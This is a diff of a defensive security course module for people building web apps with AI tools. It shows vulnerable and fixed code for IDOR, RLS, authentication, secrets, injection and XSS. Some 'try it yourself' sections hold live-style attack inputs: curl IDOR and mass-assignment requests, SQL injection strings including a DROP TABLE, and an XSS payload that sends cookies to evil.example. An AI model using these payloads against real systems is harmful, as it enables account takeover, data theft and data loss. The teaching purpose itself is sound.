@@ -39,7 +39,9 @@ By the end of this module you will be able to:
 
 ---
 
-## Vibe Fail: The Invoice Number *(illustrative composite, not a real event)*
+## Vibe Fail: The Invoice Number
+*Illustrative composite.*
+
 
 Dana runs a two-person bookkeeping firm. She vibe-codes a client portal where clients log in and download their invoices. She tests it carefully, logs in as herself, clicks "My Invoices," and sees her test invoices. Ship it.
 
@@ -53,13 +55,13 @@ This is called an **IDOR** (Insecure Direct Object Reference), and it's one of t
 
 ---
 
-# Part 1: Broken Authorization and Missing Row Level Security
+## Part 1: Broken Authorization and Missing Row Level Security
 
 **Authentication** asks *who are you?* **Authorization** asks *are you allowed to do this, to this specific thing?*
 
-AI tools are pretty good at authentication, because login flows are everywhere in training data. They're bad at authorization, because authorization depends on *your* business rules, which the model doesn't know. That's why **Broken Access Control is #1 on the OWASP Top 10:2025** ([OWASP](https://owasp.org/Top10/2025/)), and why it's behind Lovable's CVE-2025-48757, Moltbook, and most of Escape's 2,000+ findings ([Module 1](01-security-reality.md)).
+AI tools are pretty good at authentication, because login flows are everywhere in training data. They're bad at authorization, because authorization depends on *your* business rules, which the model doesn't know. That's why **Broken Access Control is #1 on the OWASP Top 10:2025** ([OWASP](https://top10.owasp.org/2025/)), and why it's behind Lovable's CVE-2025-48757, Moltbook, and most of Escape's 2,000+ findings ([Module 1](01-security-reality.md)).
 
-## 1.1 How it happens in vibe-coded apps
+### 1.1 How it happens in vibe-coded apps
 
 - **IDOR:** the endpoint takes an ID from the URL or body and fetches that record **without checking ownership**.
 - **Missing RLS:** the frontend queries Supabase directly with the public key, and the table has **no Row Level Security**, so anyone with the key (everyone) can read or write every row. Supabase's own docs say it bluntly: a table in an exposed schema without RLS "is readable and writable by any role with a grant on it." ([Supabase docs](https://supabase.com/docs/guides/database/postgres/row-level-security))
@@ -69,7 +71,7 @@ AI tools are pretty good at authentication, because login flows are everywhere i
 - **Trusting user-editable claims:** checking `role` from data the user can edit themselves, such as Supabase `user_metadata`, a hidden form field, or a value in `localStorage`.
 - **Public IDs used as secrets:** Base44's private-app bypass needed only a publicly visible `app_id` ([Wiz](https://www.wiz.io/blog/critical-vulnerability-base44)).
 
-## 1.2 Bad vs. good: IDOR in an API route (TypeScript / Express)
+### 1.2 Bad vs. good: IDOR in an API route (TypeScript / Express)
 
 ❌ **Bad.** This is what you get from "make an endpoint to fetch an invoice by ID":
 
@@ -108,7 +110,67 @@ Key ideas:
 - Return **404, not 403**, for other people's records, so attackers can't map which IDs exist.
 - Random IDs (UUIDs) instead of sequential numbers make guessing harder, but they **don't replace** the ownership check. IDs leak through URLs, logs, and shared links.
 
-## 1.3 Bad vs. good: Supabase Row Level Security (SQL)
+**Same bug, Next.js App Router.** AI builders love the App Router, and the IDOR looks identical there. A route handler (or a server action) runs on the server, but that does **not** mean it knows who's calling: you still have to read the session yourself and scope the query.
+
+```ts
+// ❌ Bad — app/api/invoices/[id]/route.ts
+import { prisma } from "@/lib/db";
+
+export async function GET(_req: Request, { params }: { params: { id: string } }) {
+  const invoice = await prisma.invoice.findUnique({ where: { id: Number(params.id) } });
+  return Response.json(invoice);          // any caller, any invoice
+}
+```
+
+```ts
+// ✅ Good — identity from the session, ownership in the query
+import { prisma } from "@/lib/db";
+import { getServerSession } from "@/lib/auth";
+
+export async function GET(_req: Request, { params }: { params: { id: string } }) {
+  const session = await getServerSession();
+  if (!session) return new Response("Unauthorized", { status: 401 });
+
+  const invoice = await prisma.invoice.findFirst({
+    where: { id: Number(params.id), ownerId: session.user.id },
+  });
+  if (!invoice) return new Response("Not found", { status: 404 });
+  return Response.json(invoice);
+}
+```
+
+And in Python (FastAPI), the shape is the same: the user comes from a dependency that validates the token, and ownership is a `WHERE` clause.
+
+```python
+# ✅ Good — FastAPI
+@app.get("/invoices/{invoice_id}")
+def get_invoice(invoice_id: int, user_id: int = Depends(current_user)):
+    row = db.execute(
+        "SELECT * FROM invoices WHERE id = ? AND owner_id = ?", (invoice_id, user_id)
+    ).fetchone()
+    if row is None:
+        raise HTTPException(status_code=404, detail="Not found")
+    return row
+```
+
+**Try it yourself** (on an app you own). This is the whole vulnerability in three commands. With two test accounts, Alice (invoice 1001) and Bob (invoice 1002):
+
+```bash
+# Exploit: as Alice, ask for Bob's invoice
+curl -s localhost:3000/api/invoices/1002 -H "Authorization: Bearer <alice-token>"
+# Vulnerable version returns Bob's invoice. That's the IDOR.
+
+# Verify the fix: the same request now returns 404
+curl -s -o /dev/null -w "%{http_code}\n" localhost:3000/api/invoices/1002 \
+  -H "Authorization: Bearer <alice-token>"        # expect 404
+
+# And confirm Alice can still read her own
+curl -s localhost:3000/api/invoices/1001 -H "Authorization: Bearer <alice-token>"  # 200, her data
+```
+
+A fixed endpoint returns **404 for the record you don't own and 200 for the one you do.** If you get the other person's data back, you have the bug.
+
+### 1.3 Bad vs. good: Supabase Row Level Security (SQL)
 
 If your frontend talks to Supabase directly (as Lovable, Bolt, and many AI builders set it up), **RLS is your entire backend authorization layer.** The `anon` (publishable) key is in the browser by design. The only thing between it and your data is RLS.
 
@@ -216,7 +278,7 @@ Keep the bucket **private** (not "public"), and serve files through short-lived 
 
 **Test your policies; don't trust them.** Supabase recommends pgTAP tests (`supabase test db`) that assert both *allow* and *deny* for every operation, as `anon` and as two different signed-in users. Their docs put it plainly: "Until the suite passes, you don't know whether the policies do what you intended." ([Supabase docs](https://supabase.com/docs/guides/database/postgres/row-level-security)) A quick manual version is in the exercise at the end.
 
-## 1.4 Bad vs. good: Firebase security rules
+### 1.4 Bad vs. good: Firebase security rules
 
 ❌ **Bad: "test mode" left on.** This is the shape of rule behind countless exposed buckets and databases:
 
@@ -284,7 +346,7 @@ service firebase.storage {
 
 Test rules with the **Firebase Emulator Suite** and the Rules Playground before deploying ([Firebase Security Rules docs](https://firebase.google.com/docs/rules)).
 
-## 1.5 Bad vs. good: client-side-only authorization (React + API)
+### 1.5 Bad vs. good: client-side-only authorization (React + API)
 
 ❌ **Bad: the button is hidden, the door isn't locked.**
 
@@ -326,11 +388,44 @@ app.delete("/api/users/:id", requireAuth, requireRole("admin"), async (req, res)
 
 **Rule of thumb:** *the frontend decides what to show; the backend decides what's allowed.* If you deleted your whole frontend and attacked the API with `curl`, every rule should still hold.
 
-## 1.6 Authentication pitfalls: the login code AI gets almost right
+**Next.js Server Actions are endpoints, too.** The App Router lets you write a `"use server"` function and call it like a normal function from a component. It *feels* like private internal code, which is exactly the trap. Next.js's own docs are blunt: a Server Action "is reachable via a direct POST request, not just through your application's UI" ([Next.js data security](https://nextjs.org/docs/app/guides/data-security)). An attacker can invoke it with the right request even if your UI never shows the button. So every Server Action needs its own auth and authorization, just like a route handler.
 
-Authorization decides what you can do. **Authentication** is how the app knows who you are in the first place, and when it's wrong, every authorization check above is checking the wrong person. OWASP lists **A07 Authentication Failures** in its 2025 Top 10 ([OWASP](https://owasp.org/Top10/2025/)). If you use a managed auth provider (Supabase Auth, Firebase Auth, Clerk, Auth0, and so on), it handles much of this for you, and **that's usually the right call.** These pitfalls show up when the AI rolls its own auth, or when it glues a provider into your app incorrectly.
+```ts
+// ❌ Bad — app/actions.ts
+"use server";
+import { prisma } from "@/lib/db";
 
-### Pitfall 1: Storing passwords badly
+export async function deletePost(postId: string) {
+  // No session check: this "internal" action is a public POST endpoint.
+  await prisma.post.delete({ where: { id: postId } });
+}
+```
+
+```ts
+// ✅ Good — authenticate and authorize inside the action
+"use server";
+import { prisma } from "@/lib/db";
+import { getServerSession } from "@/lib/auth";
+
+export async function deletePost(postId: string) {
+  const session = await getServerSession();
+  if (!session) throw new Error("Unauthorized");
+
+  // Scope by ownership: the delete only affects a row this user owns.
+  const result = await prisma.post.deleteMany({
+    where: { id: postId, authorId: session.user.id },
+  });
+  if (result.count === 0) throw new Error("Not found");
+}
+```
+
+The lesson repeats across every framework: **"runs on the server" is not "checks who's calling."** Route handlers, server actions, tRPC procedures, and GraphQL resolvers are all reachable directly. Each one authenticates and authorizes on its own.
+
+### 1.6 Authentication pitfalls: the login code AI gets almost right
+
+Authorization decides what you can do. **Authentication** is how the app knows who you are in the first place, and when it's wrong, every authorization check above is checking the wrong person. OWASP lists **A07 Authentication Failures** in its 2025 Top 10 ([OWASP](https://top10.owasp.org/2025/)). If you use a managed auth provider (Supabase Auth, Firebase Auth, Clerk, Auth0, and so on), it handles much of this for you, and **that's usually the right call.** These pitfalls show up when the AI rolls its own auth, or when it glues a provider into your app incorrectly.
+
+#### Pitfall 1: Storing passwords badly
 
 ❌ **Bad:**
 
@@ -374,7 +469,7 @@ except VerifyMismatchError:
 
 The OWASP Password Storage Cheat Sheet recommends **Argon2id** (minimum 19 MiB memory, 2 iterations, parallelism 1), then scrypt, with bcrypt (work factor 10 or more) for legacy systems ([OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)). Never MD5 or SHA-anything by itself. Those are *designed* to be fast, which is exactly what a password cracker wants.
 
-### Pitfall 2: Decoding JWTs instead of verifying them
+#### Pitfall 2: Decoding JWTs instead of verifying them
 
 A JWT (JSON Web Token) is a signed blob saying "this is user 123." The *signature* is the only thing that makes it trustworthy. AI-generated code sometimes reads the contents without checking it.
 
@@ -397,7 +492,7 @@ req.user = { id: payload.sub };
 
 If you use Supabase or Firebase, verify tokens with the provider's server SDK (for example `supabase.auth.getUser(token)` or the Firebase Admin SDK's `verifyIdToken`) rather than hand-decoding them.
 
-### Pitfall 3: Session tokens in `localStorage`
+#### Pitfall 3: Session tokens in `localStorage`
 
 ❌ **Bad (for most apps):**
 
@@ -421,7 +516,12 @@ An HttpOnly cookie doesn't make XSS harmless (injected script can still act *as*
 
 Also: **log out means invalidate on the server**, not just "delete the token in the browser." And give sessions an expiry.
 
-### Pitfall 4: Password reset and magic links
+**An honest caveat for Supabase and similar SDKs.** "Never use `localStorage`" is too strong, and following it blindly will break things. By default, `supabase-js` stores the user's session in `localStorage` in the browser; that's the documented, supported behavior, not a bug you introduced. The real guidance is: for a browser-only SPA, the SDK default is normal and acceptable. But if you're on a framework that renders on the server (Next.js, SvelteKit, Remix), use **`@supabase/ssr`**, which stores the session in **cookies** instead of local storage, so the server can read it and you get the `HttpOnly` protection above. Supabase's server-side auth guide says exactly this: "store the user session in cookies instead of local storage." ([Supabase server-side auth](https://supabase.com/docs/guides/auth/server-side))
+
+So the rule, stated accurately: a **long-lived secret** (a `service_role`/secret key, or a hand-rolled JWT you treat as a password) should never sit in `localStorage`. A **short-lived session token managed by a reputable SDK** in a pure client app is a lower, accept-with-eyes-open risk, and moving to cookie-based sessions (via `@supabase/ssr` or an HttpOnly cookie you set yourself) is the upgrade when the app renders on a server or handles sensitive data.
+
+
+#### Pitfall 4: Password reset and magic links
 
 Reset links and magic links are passwords that arrive by email. Treat them that way.
 
@@ -478,7 +578,7 @@ app.post("/reset-password", resetRateLimit, async (req, res) => {
 
 The OWASP Forgot Password Cheat Sheet covers the same rules: consistent responses, random single-use tokens with short expiry, and not trusting the Host header when building links ([OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)).
 
-### Pitfall 5: Skipping email verification
+#### Pitfall 5: Skipping email verification
 
 If your app grants access the moment someone types an email address, anyone can sign up as `ceo@yourcustomer.com`. That matters whenever you use email for anything meaningful: team invites, "users from @company.com can see company data," or sending notifications.
 
@@ -486,11 +586,11 @@ If your app grants access the moment someone types an email address, anyone can 
 - In Firebase rules, you can require `request.auth.token.email_verified == true` for sensitive paths.
 - **Never** grant access based on an email domain unless that email has been verified.
 
-### Pitfall 6: No limits on login
+#### Pitfall 6: No limits on login
 
 No rate limit means unlimited password guessing. Section 3.7 shows a login rate limiter. Pair it with consistent error messages ("Invalid email or password," never "wrong password for this account") and, for anything sensitive, offer multi-factor authentication. Managed providers make MFA a settings toggle.
 
-## 1.7 Mass assignment: when "update my profile" updates your role
+### 1.7 Mass assignment: when "update my profile" updates your role
 
 **Mass assignment** happens when code copies *every* field from the request into the database. The user only meant to change their display name, but nothing stops them from also sending `"role": "admin"` or `"plan": "enterprise"` ([OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)). AI-generated CRUD code does this constantly, because `data: req.body` is the shortest thing that works.
 
@@ -567,7 +667,23 @@ for select to authenticated using ((select auth.uid()) = user_id);
 
 The same rule applies to **anything the client shouldn't decide**: prices, order totals, discount amounts, `isVerified`, `ownerId`, credits, and plan tier. The server computes or looks those up. It never accepts them from the request.
 
-## 1.8 Defense checklist: authorization
+**Try it yourself** (on an app you own). The exploit is just adding a field the UI never sends:
+
+```bash
+# Exploit: the profile form only sends "name", so add "role" by hand
+curl -s -X PATCH localhost:3000/me -H "Authorization: Bearer <your-token>" \
+  -H "Content-Type: application/json" -d '{"name":"Me","role":"admin"}'
+# Vulnerable (Object.assign / spread / data: body): response shows "role":"admin". You're now an admin.
+
+# Verify the fix (allowlist / .strict() schema): the extra field is rejected or ignored
+curl -s -o /dev/null -w "%{http_code}\n" -X PATCH localhost:3000/me \
+  -H "Authorization: Bearer <your-token>" -H "Content-Type: application/json" \
+  -d '{"name":"Me","role":"admin"}'      # expect 400, or 200 with role unchanged
+```
+
+**Verification request:** for every "update" endpoint, send one field you *should* control and one you shouldn't (`role`, `isAdmin`, `plan`, `credits`, `ownerId`, `verified`). Confirm the forbidden field is rejected or silently dropped, never written. Then read the handler: anything using `Object.assign`, `{ ...req.body }`, `data: req.body`, or `Model(**request.json())` is wide open.
+
+### 1.8 Defense checklist: authorization
 
 - [ ] Every endpoint or query that touches user data **checks identity on the server** (verified session or JWT), never from the request body or URL.
 - [ ] Every query for a user-owned record **includes ownership** (`WHERE owner_id = current_user`) or a role check.
@@ -584,7 +700,7 @@ The same rule applies to **anything the client shouldn't decide**: prices, order
 - [ ] Email is **verified** before it's used for anything that grants access.
 - [ ] Update endpoints use an **allowlist** of editable fields. Roles, prices, plans, and owner IDs can't be set from the request body.
 
-## 1.9 Prompt templates: authorization
+### 1.9 Prompt templates: authorization
 
 **When building a feature that touches data:**
 
@@ -672,13 +788,13 @@ the exact check that makes it safe.
 
 ---
 
-# Part 2: Secrets Management
+## Part 2: Secrets Management
 
 A **secret** is anything that grants access: API keys, database passwords, service-role keys, JWT signing secrets, OAuth client secrets, webhook signing secrets, and private keys. If an attacker gets one, they *are* you, as far as that service is concerned, and they get your bill.
 
 The scale is large. GitGuardian counted **23.8 million** secrets leaked on public GitHub in 2024, found that **70%** of those leaked in 2022 were still valid, and saw a higher leak rate in Copilot-enabled repos (6.4% vs. 4.6%) ([GitGuardian](https://www.gitguardian.com/state-of-secrets-sprawl-report-2025), [CSO Online](https://www.csoonline.com/article/3953927/ai-programming-copilots-are-worsening-code-security-and-leaking-more-secrets.html)). Escape found **400+** exposed secrets in vibe-coded apps ([Escape](https://escape.tech/blog/methodology-how-we-discovered-vulnerabilities-apps-built-with-vibe-coding/)). Moltbook users' **OpenAI keys** sat in plaintext messages anyone could read ([Wiz](https://www.wiz.io/blog/exposed-moltbook-database-reveals-millions-of-api-keys)).
 
-## 2.1 Public keys vs. secret keys: know the difference
+### 2.1 Public keys vs. secret keys: know the difference
 
 Vibe coders get confused here in both directions, either panicking about public keys or casually shipping secret ones.
 
@@ -692,7 +808,7 @@ Vibe coders get confused here in both directions, either panicking about public 
 
 "Public by design" keys are only safe because **something else** (RLS, security rules, domain restrictions) enforces access. A public key plus missing RLS equals Moltbook.
 
-## 2.2 How it happens in vibe-coded apps
+### 2.2 How it happens in vibe-coded apps
 
 - **Keys in the frontend bundle.** You ask the AI to "add an AI chat feature," and it calls the LLM API **from the browser** with your key. Anyone can open dev tools and copy it.
 - **Framework prefixes that publish variables.** In Next.js, any environment variable starting with `NEXT_PUBLIC_` is inlined into the JavaScript sent to browsers. In Vite, it's `VITE_` ([Next.js docs](https://nextjs.org/docs/app/guides/environment-variables), [Vite docs](https://vite.dev/guide/env-and-mode)). The AI renames `OPENAI_API_KEY` to `NEXT_PUBLIC_OPENAI_API_KEY` to "fix" an undefined-variable error, and your key is now public.
@@ -701,7 +817,7 @@ Vibe coders get confused here in both directions, either panicking about public 
 - **Pasted into chats, tickets, and logs.** Secrets in AI chat transcripts, Slack, Jira, screenshots, and `console.log(process.env)`.
 - **Never rotated.** A key leaks, someone deletes the commit, and the key stays valid for years (see GitGuardian's 70%).
 
-## 2.3 Bad vs. good: calling an LLM API (TypeScript)
+### 2.3 Bad vs. good: calling an LLM API (TypeScript)
 
 ❌ **Bad: the API key ships to every visitor.**
 
@@ -757,7 +873,7 @@ export async function POST(req: Request) {
 const res = await fetch("/api/ask", { method: "POST", body: JSON.stringify({ prompt }) });
 ```
 
-## 2.4 Bad vs. good: configuration (Python)
+### 2.4 Bad vs. good: configuration (Python)
 
 ❌ **Bad:**
 
@@ -795,7 +911,7 @@ OPENAI_API_KEY=
 
 In production, set secrets in your hosting platform's environment-variable or secrets settings (Vercel, Netlify, Fly, Render, Railway, AWS Secrets Manager, and so on), not in files.
 
-## 2.5 When a secret leaks: rotate first, clean up second
+### 2.5 When a secret leaks: rotate first, clean up second
 
 Deleting the file **doesn't un-leak the secret.** Git keeps history, forks and clones keep copies, and bots scan public GitHub continuously. The correct order is:
 
@@ -805,7 +921,7 @@ Deleting the file **doesn't un-leak the secret.** Git keeps history, forks and c
 4. **Then clean history** if needed (for example with `git filter-repo`), knowing that anyone who already cloned it still has it.
 5. **Add scanning** so it doesn't happen again (below).
 
-## 2.6 Secret scanning: let robots catch what you miss
+### 2.6 Secret scanning: let robots catch what you miss
 
 ```bash
 # Scan the current repo AND its full git history
@@ -816,9 +932,54 @@ trufflehog git file://. --only-verified           # https://github.com/trufflese
 npm run build && gitleaks dir ./dist -v            # or ./build, ./.next/static
 ```
 
-Also turn on **GitHub secret scanning and push protection**, which blocks pushes containing recognized secrets before they land ([GitHub docs](https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection)). Add a pre-commit hook that runs `gitleaks` so secrets never reach a commit in the first place.
+Also turn on **GitHub secret scanning and push protection**, which blocks pushes containing recognized secrets before they land ([GitHub docs](https://docs.github.com/en/code-security/concepts/secret-security/push-protection)). Add a pre-commit hook that runs `gitleaks` so secrets never reach a commit in the first place.
 
-## 2.7 Defense checklist: secrets
+
+### 2.7 Walkthrough: how a secret ends up in the browser (`NEXT_PUBLIC_`)
+
+The single most common way vibe-coded apps leak a secret key isn't git history, it's a build-time environment variable with the wrong prefix. Frameworks deliberately expose some env vars to the browser so your client code can read, say, a public API URL. The rule is a naming convention, and it's easy to apply to the wrong key.
+
+- **Next.js:** any variable prefixed **`NEXT_PUBLIC_`** is inlined into the client bundle and shipped to every visitor ([Next.js docs](https://nextjs.org/docs/app/guides/environment-variables)).
+- **Vite (React/Vue/Svelte):** any variable prefixed **`VITE_`** is exposed the same way ([Vite docs](https://vite.dev/guide/env-and-mode)).
+
+Here's the mistake, which an AI will happily make if you ask it to "use the OpenAI key on the client" or just copy an existing `NEXT_PUBLIC_` line:
+
+```bash
+# .env — ❌ Bad: the prefix ships this secret to every browser
+NEXT_PUBLIC_OPENAI_API_KEY=sk-proj-REAL_SECRET_HERE
+```
+
+```tsx
+// Client component — reads it happily, and so does anyone with dev tools
+const key = process.env.NEXT_PUBLIC_OPENAI_API_KEY; // now in the JS bundle, forever
+```
+
+**See it leak (on your own app).** Build the app and grep the output, which is exactly what an attacker does:
+
+```bash
+npm run build
+grep -r "sk-proj-" .next/   # or dist/ for Vite — if your secret prints, it shipped
+```
+
+✅ **The fix: secret keys have no public prefix and are only read on the server.**
+
+```bash
+# .env — no NEXT_PUBLIC_/VITE_ prefix, so it stays server-side
+OPENAI_API_KEY=sk-proj-REAL_SECRET_HERE
+NEXT_PUBLIC_APP_URL=https://app.example.com   # fine: a public value, meant to be shipped
+```
+
+```ts
+// Server only: a route handler, server action, or API route
+export async function POST(req: Request) {
+  const key = process.env.OPENAI_API_KEY; // never prefixed, never bundled
+  // ...call the LLM here, on the server, then return only the result to the client
+}
+```
+
+**Verification request:** grep your built bundle (`.next/`, `dist/`, or whatever you deploy) for every secret value and for the strings `sk_`, `sk-`, `service_role`. The only keys you should find are ones that are public by design (a Supabase publishable/anon key, a Stripe publishable key, a Firebase web config). If a secret key is in there, rotate it immediately (section 2.5's rule: rotate first), then move it server-side.
+
+### 2.8 Defense checklist: secrets
 
 - [ ] You can list every secret your app uses, and **none** of them are in frontend code, `NEXT_PUBLIC_*` / `VITE_*` variables, or the built bundle.
 - [ ] `.env` files are in `.gitignore`, and a `.env.example` with **names only** is committed.
@@ -829,7 +990,7 @@ Also turn on **GitHub secret scanning and push protection**, which blocks pushes
 - [ ] You know **how to rotate** each key, and you rotate immediately on any suspected leak.
 - [ ] No secrets in logs, error messages, screenshots, tickets, or AI chat transcripts.
 
-## 2.8 Prompt templates: secrets
+### 2.9 Prompt templates: secrets
 
 ```text
 Secrets rules for this project (apply to all code you write):
@@ -859,13 +1020,13 @@ run them myself rather than trusting this audit.
 
 ---
 
-# Part 3: Injection and Insecure Defaults
+## Part 3: Injection and Insecure Defaults
 
-**Injection** happens when **untrusted input is treated as code or commands.** SQL, NoSQL queries, shell commands, HTML, and now LLM prompts are all languages. If user input can change the *structure* of what runs, rather than just the *data*, you have injection. It's **A05 on the OWASP Top 10:2025** ([OWASP](https://owasp.org/Top10/2025/)). Veracode found AI models failed to prevent XSS in **86%** of relevant tests and log injection in **88%** ([Veracode](https://www.businesswire.com/news/home/20250730694951/en/AI-Generated-Code-Poses-Major-Security-Risks-in-Nearly-Half-of-All-Development-Tasks-Veracode-Research-Reveals)). The Stanford study saw **36%** of AI-assisted participants write SQL-injectable code, vs. **7%** without AI ([Perry et al.](https://arxiv.org/abs/2211.03622)).
+**Injection** happens when **untrusted input is treated as code or commands.** SQL, NoSQL queries, shell commands, HTML, and now LLM prompts are all languages. If user input can change the *structure* of what runs, rather than just the *data*, you have injection. It's **A05 on the OWASP Top 10:2025** ([OWASP](https://top10.owasp.org/2025/)). Veracode found AI models failed to prevent XSS in **86%** of relevant tests and log injection in **88%** ([Veracode](https://www.businesswire.com/news/home/20250730694951/en/AI-Generated-Code-Poses-Major-Security-Risks-in-Nearly-Half-of-All-Development-Tasks-Veracode-Research-Reveals)). The Stanford study saw **36%** of AI-assisted participants write SQL-injectable code, vs. **7%** without AI ([Perry et al.](https://arxiv.org/abs/2211.03622)).
 
 **Insecure defaults** are the settings that make development easy and production dangerous: wildcard CORS, debug mode, permissive rules, no rate limits. Security Misconfiguration is **A02 on the OWASP Top 10:2025**.
 
-## 3.1 How it happens in vibe-coded apps
+### 3.1 How it happens in vibe-coded apps
 
 - The AI builds queries with **string concatenation or template literals** because it's shorter and "works."
 - Login code passes the **request body straight into a MongoDB query**.
@@ -876,7 +1037,7 @@ run them myself rather than trusting this audit.
 - `debug=True` / `DEBUG = True` gets set during development and ships.
 - Nobody adds **rate limits**, so logins can be brute-forced and paid APIs drained.
 
-## 3.2 SQL injection
+### 3.2 SQL injection
 
 ❌ **Bad (JavaScript, `pg`):**
 
@@ -917,7 +1078,19 @@ ORMs (Prisma, Drizzle, SQLAlchemy, Django ORM) and the Supabase client parameter
 
 Also note: **identifiers can't be parameterized.** If the user picks a sort column, map it through an **allowlist** (`{"newest": "created_at", "price": "price"}`) rather than interpolating it.
 
-## 3.3 NoSQL injection (MongoDB)
+**Try it yourself** (FastAPI + SQLite, on an app you own). A search endpoint that pastes input into SQL is the classic. Expected behavior:
+
+```text
+# Exploit against the string-built query ("notes WHERE title LIKE '%<q>%'"):
+GET /v1/notes/search?q=' OR 1=1 --     → returns EVERY row, not just matches
+
+# Same attack against the parameterized version (WHERE title LIKE ?):
+GET /v2/notes/search?q=' OR 1=1 --     → returns []  (the string is treated as data)
+```
+
+**Verification request:** send `' OR 1=1 --` and `'); DROP TABLE notes; --` to every search and filter box. A safe endpoint returns zero or normal results and changes nothing; a vulnerable one returns rows it shouldn't. Then grep your code for query strings built with template literals, f-strings, `%`, or `+`, and for raw escape hatches (`$queryRawUnsafe`, `.extra()`, `text()`).
+
+### 3.3 NoSQL injection (MongoDB)
 
 ❌ **Bad:**
 
@@ -952,9 +1125,11 @@ app.post("/login", loginRateLimit, async (req, res) => {
 });
 ```
 
+(On the hash: this example uses **bcrypt**, which is fine for a password hash at a work factor of **10 or higher**. For new code, prefer **Argon2id** as recommended in Pitfall 1, section 1.6; the point here is that passwords are hashed and verified, never compared in plaintext.)
+
 **Validate the shape and type of every input at the boundary.** A schema validator (zod, valibot, pydantic) kills whole classes of injection by itself.
 
-## 3.4 Command injection
+### 3.4 Command injection
 
 ❌ **Bad (Node):**
 
@@ -991,7 +1166,7 @@ subprocess.run(["ping", "-c", "1", host], check=True, timeout=5)  # no shell=Tru
 
 Better still: use a library (an image library, an HTTP client) instead of shelling out at all.
 
-## 3.5 Cross-site scripting (XSS)
+### 3.5 Cross-site scripting (XSS)
 
 XSS means an attacker gets **their JavaScript to run in another user's browser**, where it can steal sessions, act as the victim, or rewrite the page.
 
@@ -1017,7 +1192,43 @@ import DOMPurify from "dompurify";
 
 Also watch for: `element.innerHTML = userInput`, `href={userUrl}` (block `javascript:` URLs by allowing only `http:` and `https:`), server templates with escaping turned off (`|safe`, `{{{ }}}`, `<%- %>`), and **markdown renderers that allow raw HTML.** Add a **Content-Security-Policy** header as a second layer of defense.
 
-## 3.6 Prompt injection: the new one
+**The sneaky version: markdown and rich text.** Lots of AI-built apps render user markdown (comments, docs, bios) by converting it to HTML and dropping it in with `dangerouslySetInnerHTML`. Most markdown libraries pass raw HTML through by default, so a comment can smuggle a script in:
+
+```tsx
+// ❌ Bad — markdown → HTML → injected without sanitizing
+import { marked } from "marked";
+<div dangerouslySetInnerHTML={{ __html: marked.parse(comment.body) }} />
+```
+
+Markdown that renders as an attack:
+
+```markdown
+Nice post! <img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
+
+[click me](javascript:alert(document.domain))
+```
+
+```tsx
+// ✅ Good — sanitize the generated HTML before it touches the DOM
+import { marked } from "marked";
+import DOMPurify from "dompurify";
+const html = DOMPurify.sanitize(marked.parse(comment.body));
+<div dangerouslySetInnerHTML={{ __html: html }} />
+```
+
+**Try it yourself.** Render that comment both ways and watch the difference. Expected output:
+
+```text
+UNSAFE: <p>Nice post! <img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"></p>
+        <p><a href="javascript:alert(document.domain)">click me</a></p>
+SAFE:   <p>Nice post! <img src="x"></p>
+        <p><a>click me</a></p>
+```
+
+The sanitizer stripped the `onerror` handler and the `javascript:` URL while keeping the harmless markup. **Verification request:** post a comment containing `<img src=x onerror=alert(1)>`, load the page, and confirm no alert fires and the saved HTML has no `onerror` attribute (check with your browser's element inspector). If an alert pops, your renderer is passing raw HTML through.
+
+
+### 3.6 Prompt injection: the new one
 
 If your app sends **untrusted text to an LLM** (user messages, uploaded documents, web pages, emails) and that LLM can **take actions** or **see private data**, then the untrusted text can give it instructions. OWASP ranks prompt injection **#1 (LLM01)** in its Top 10 for LLM applications, and distinguishes *direct* injection (the user types it) from *indirect* injection (it's hidden in content the model reads) ([OWASP GenAI](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)).
 
@@ -1066,7 +1277,7 @@ Prompt-injection defenses, in priority order:
 
 This applies to **your coding agent too.** A README, issue, or web page your agent reads can carry instructions. That's one more reason to keep agents away from production credentials (Module 1, Checklist B).
 
-## 3.7 Insecure defaults
+### 3.7 Insecure defaults
 
 **CORS**
 
@@ -1081,7 +1292,7 @@ app.use(cors({ origin: true, credentials: true })); // reflects ANY origin WITH 
 
 ```js
 app.use(cors({
-  origin: ["https://myapp.com", "https://www.myapp.com"], // explicit allowlist
+  origin: ["https://app.example.com", "https://www.example.com"], // explicit allowlist
   credentials: true,
 }));
 ```
@@ -1109,7 +1320,7 @@ app.run(debug=os.environ.get("FLASK_DEBUG") == "1")   # off unless explicitly en
 
 ```python
 DEBUG = os.environ.get("DJANGO_DEBUG") == "1"
-ALLOWED_HOSTS = ["myapp.com", "www.myapp.com"]
+ALLOWED_HOSTS = ["example.com", "www.example.com"]
 ```
 
 Flask's own documentation warns not to run the debugger in production, because it allows executing arbitrary Python code from the browser ([Flask docs](https://flask.palletsprojects.com/en/stable/debugging/)).
@@ -1169,7 +1380,7 @@ Also set **spending caps** at your LLM, SMS, and email providers. That's a rate 
 - Supabase or Firebase "test mode" rules, and public storage buckets (Part 1).
 - Admin panels or API docs (`/admin`, `/docs`, `/graphql` introspection) exposed publicly.
 
-## 3.8 SSRF: "fetch this URL for me"
+### 3.8 SSRF: "fetch this URL for me"
 
 **Server-Side Request Forgery (SSRF)** happens when your server fetches a URL the user supplies, and the user points it somewhere only your server can reach: `localhost`, your internal network, or the cloud **metadata service** that hands out credentials. AI tools add "fetch a URL" features casually: link previews, "import from URL," webhooks you call out to, PDF-from-web-page, and "let the AI browse this page."
 
@@ -1226,7 +1437,7 @@ Honest caveat: a check-then-fetch like this can still be beaten by **DNS rebindi
 
 See the OWASP SSRF Prevention Cheat Sheet for more ([OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)).
 
-## 3.9 File uploads
+### 3.9 File uploads
 
 "Let users upload a profile picture" sounds harmless. Unchecked, it means: files of any size (fill your disk, run up your bill), files of any type (an `.html` file served from your domain is stored XSS), original filenames used as paths (`../../`), and public URLs for private documents (Tea's verification selfies).
 
@@ -1283,7 +1494,7 @@ Upload rules of thumb (see the OWASP File Upload Cheat Sheet: [OWASP](https://ch
 - **Re-encode images.** It removes metadata such as GPS location and neutralizes many malformed-file tricks.
 - For documents from untrusted users, consider malware scanning.
 
